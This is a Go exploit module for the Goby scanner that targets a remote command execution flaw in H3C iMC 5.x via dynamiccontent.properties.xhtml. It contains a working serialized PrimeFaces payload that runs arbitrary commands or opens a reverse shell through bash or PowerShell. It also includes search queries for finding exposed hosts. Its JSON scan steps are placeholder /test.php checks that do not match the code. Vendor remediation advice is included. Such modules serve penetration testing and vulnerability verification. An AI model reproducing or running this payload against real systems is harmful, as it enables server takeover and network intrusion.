package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "H3C iMC dynamiccontent.properties.xhtml remote command execution vulnerability",
    "Description": "<p>iMC is a unified management platform for H3C solutions, capable of hosting various management services such as endpoint detection systems, intelligent marketing portals, access security management, mobile office, and network resource management.</p><p>The version 5.x of this system has a vulnerability that allows arbitrary command execution. Exploiting this vulnerability enables attackers to execute malicious commands directly, potentially obtaining server host privileges.</p>",
    "Product": "H3C-iMC",
    "Homepage": "https://www.h3c.com/cn/",
    "DisclosureDate": "2021-04-12",
    "PostTime": "2023-07-24",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "(body=\"iMC来宾接入自助管理系统\" && body=\"login_logo_h3c.png.jsf\") || body=\"com_h3c_imc_usr_usermgr_alluser_overlaydiv\" || body=\"action=\\\"/imc/login.jsf\" || body=\"src=\\\"/imc/javax.faces.resource/images/login_logo_h3c.png.jsf?ln=primefaces-imc-new-webui\" || body=\"<span class=\\\"cmn_mn_normalFont\\\">H3C 智能管理中心\" || body=\"src=\\\"/imc/faces/extensionResource/com.h3c.imc.component.util.ExtensionResourceLoader/\" || body=\"H3C &#26234;&#33021;&#31649;&#29702;&#20013;&#24515;</span>\" || body=\"href=\\\"/selfservice/javax.faces.resource/theme.css.xhtml?ln=primefaces-imc-classic-blue\\\"\"",
    "GobyQuery": "(body=\"iMC来宾接入自助管理系统\" && body=\"login_logo_h3c.png.jsf\") || body=\"com_h3c_imc_usr_usermgr_alluser_overlaydiv\" || body=\"action=\\\"/imc/login.jsf\" || body=\"src=\\\"/imc/javax.faces.resource/images/login_logo_h3c.png.jsf?ln=primefaces-imc-new-webui\" || body=\"<span class=\\\"cmn_mn_normalFont\\\">H3C 智能管理中心\" || body=\"src=\\\"/imc/faces/extensionResource/com.h3c.imc.component.util.ExtensionResourceLoader/\" || body=\"H3C &#26234;&#33021;&#31649;&#29702;&#20013;&#24515;</span>\" || body=\"href=\\\"/selfservice/javax.faces.resource/theme.css.xhtml?ln=primefaces-imc-classic-blue\\\"\"",
    "Level": "3",
    "Impact": "<p>The version 5.x of this system has a vulnerability that allows arbitrary command execution. Exploiting this vulnerability enables attackers to execute malicious commands directly, potentially obtaining server host privileges.</p>",
    "Recommendation": "<p>1. Please contact the vendor to fix this vulnerability: You can reach out to the vendor by visiting <a href=\"http://www.h3c.com/en/\">http://www.h3c.com/en/</a> and report this vulnerability. The vendor will be able to provide relevant patches or updates to address the security vulnerability.</p><p>2. Set up access policies using security devices such as firewalls: Ensure that appropriate network security devices, such as firewalls, are in place to restrict access to the system. Configure whitelist-based access, allowing only authorized IP addresses or specific network ranges to access the system. This helps prevent unauthorized access and potential attacks.</p><p>3. Disable public network access to the system if not necessary: If it is not necessary to expose the system to the public network, it is highly recommended to prohibit public network access. Place the system in a private network and use secure isolation measures, such as a virtual private network (VPN) or other remote access methods, for remote connectivity and management. This reduces the risk of direct attacks from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "windows,linux",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "H3C iMC dynamiccontent.properties.xhtml 远程命令执行漏洞",
            "Product": "H3C-iMC",
            "Description": "<p>iMC 是 H3C 系列解决方案的统一管控平台，可以承载终端探测系统、智能营销门户、准入安全管理、移动办公、网络资源管理等众多管理业务。</p><p>该系统 5.x 版本&nbsp;dynamiccontent.properties.xhtml 存在任意命令执行漏洞，可以通过该漏洞直接执行恶意命令，从而获取服务器主机权限。</p>",
            "Recommendation": "<p>1、请联系厂商修复该漏洞：<a href=\"http://www.h3c.com/cn/\" target=\"_blank\">http://www.h3c.com/cn/</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>该系统 5.x 版本存在任意命令执行漏洞，可以通过该漏洞直接执行恶意命令，从而获取服务器主机权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "H3C iMC dynamiccontent.properties.xhtml remote command execution vulnerability",
            "Product": "H3C-iMC",
            "Description": "<p>iMC is a unified management platform for H3C solutions, capable of hosting various management services such as endpoint detection systems, intelligent marketing portals, access security management, mobile office, and network resource management.</p><p>The version 5.x of this system has a vulnerability that allows arbitrary command execution. Exploiting this vulnerability enables attackers to execute malicious commands directly, potentially obtaining server host privileges.</p>",
            "Recommendation": "<p>1. Please contact the vendor to fix this vulnerability: You can reach out to the vendor by visiting <a href=\"http://www.h3c.com/en/\">http://www.h3c.com/en/</a> and report this vulnerability. The vendor will be able to provide relevant patches or updates to address the security vulnerability.</p><p>2. Set up access policies using security devices such as firewalls: Ensure that appropriate network security devices, such as firewalls, are in place to restrict access to the system. Configure whitelist-based access, allowing only authorized IP addresses or specific network ranges to access the system. This helps prevent unauthorized access and potential attacks.</p><p>3. Disable public network access to the system if not necessary: If it is not necessary to expose the system to the public network, it is highly recommended to prohibit public network access. Place the system in a private network and use secure isolation measures, such as a virtual private network (VPN) or other remote access methods, for remote connectivity and management. This reduces the risk of direct attacks from the public network.</p>",
            "Impact": "<p>The version 5.x of this system has a vulnerability that allows arbitrary command execution. Exploiting this vulnerability enables attackers to execute malicious commands directly, potentially obtaining server host privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9942"
}`

	sendPayloadFlagYume := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cmd = url.QueryEscape(cmd)
		postData := "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=" + cmd
		postRequestConfig := httpclient.NewPostRequestConfig("/imc/javax.faces.resource/dynamiccontent.properties.xhtml")
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = postData
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(32)
			rsp, err := sendPayloadFlagYume(hostInfo, `echo `+randomStr)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, randomStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			// 默认为执行命令
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			if attackType != "cmd" && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			if attackType == "reverse" {
				reverse := goutils.B2S(ss.Params["reverse"])
				rp, err := godclient.WaitSession("reverse_"+reverse, waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				if reverse == "windows" {
					cmd = godclient.ReverseTCPByPowershell(rp)
				} else {
					cmd = `bash -c '` + godclient.ReverseTCPByBash(rp) + `'`
				}
			}
			rsp, err := sendPayloadFlagYume(expResult.HostInfo, cmd)
			if err != nil && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "cmd" {
				if rsp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				} else {
					expResult.Success = false
					expResult.Output = "命令执行失败"
				}
			} else if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
